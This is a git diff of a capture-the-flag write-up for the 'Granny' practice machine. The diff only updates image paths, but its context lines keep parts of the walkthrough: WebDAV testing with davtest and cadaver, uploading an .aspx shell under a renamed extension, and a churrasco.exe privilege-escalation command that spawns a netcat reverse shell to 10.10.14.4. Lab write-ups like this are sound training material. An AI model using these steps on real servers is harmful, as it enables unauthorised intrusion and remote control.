@@ -66,11 +66,11 @@ Microsoft IIS 6.0 on port 80
 
 ## HTTP Port 80
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025171939.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025171939.png" alt=""><figcaption></figcaption></figure>
 
 ### Web Fuzz
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025172111.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025172111.png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting WebDav
 
@@ -86,7 +86,7 @@ Two useful resources for exploit WebDav are:
 
 You can tell what functions are avaiable based on the script scan from Nmap
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025174456.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025174456.png" alt=""><figcaption></figcaption></figure>
 
 Using the handy tool davtest:
 
@@ -94,9 +94,9 @@ Using the handy tool davtest:
 davtest -url http://granny.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025174307.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025174307.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025174354.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025174354.png" alt=""><figcaption></figcaption></figure>
 
 So the PUT method works. One thing to note is the files we are allowed to upload and ones that can execute. Knowing this will save us time and unneccessary headaches when trying to get a reverse shell
 
@@ -108,9 +108,9 @@ First we test with PUT
 cadaver http://granny.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025174733.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025174733.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025174935.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025174935.png" alt=""><figcaption></figcaption></figure>
 
 Now we'll upload a shell. Since .jsp and .php files cannot be executed, we will try a .aspx file, but since that's not allowed to be uploaded, we'll change the file type to .txt pre-upload and then rename it back post-upload.
 
@@ -136,11 +136,11 @@ nc -lnvp 443
 http://granny.htb/shell.aspx
 ```
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025184942.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025184942.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025185023.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025185023.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221025185039.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221025185039.png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -187,7 +187,7 @@ Because of how old the box is, most likely people will use Windows Exploit Sugge
 
 First type `whoami && whoami /priv`
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221028221539.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221028221539.png" alt=""><figcaption></figcaption></figure>
 
 &#x20;Seeing this being enabled is very nice and comes in handy for the priv esc route I took.
 
@@ -199,7 +199,7 @@ So we see here that we're a network service account and this service account can
 
 Before running the exploit, if you don't specify the exact path of where netcat is, then you'll see the following error&#x20;
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221028221216.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221028221216.png" alt=""><figcaption></figcaption></figure>
 
 Searching up the error led me to this post on stack overflow&#x20;
 
@@ -211,6 +211,6 @@ After specifying the path, you should receive a callback
 churrasco.exe "c:\inetpub\wwwroot\nc.exe 10.10.14.4 443 -e cmd.exe"
 ```
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221028215839.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221028215839.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20221028221419.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/Pasted image 20221028221419.png" alt=""><figcaption></figcaption></figure>
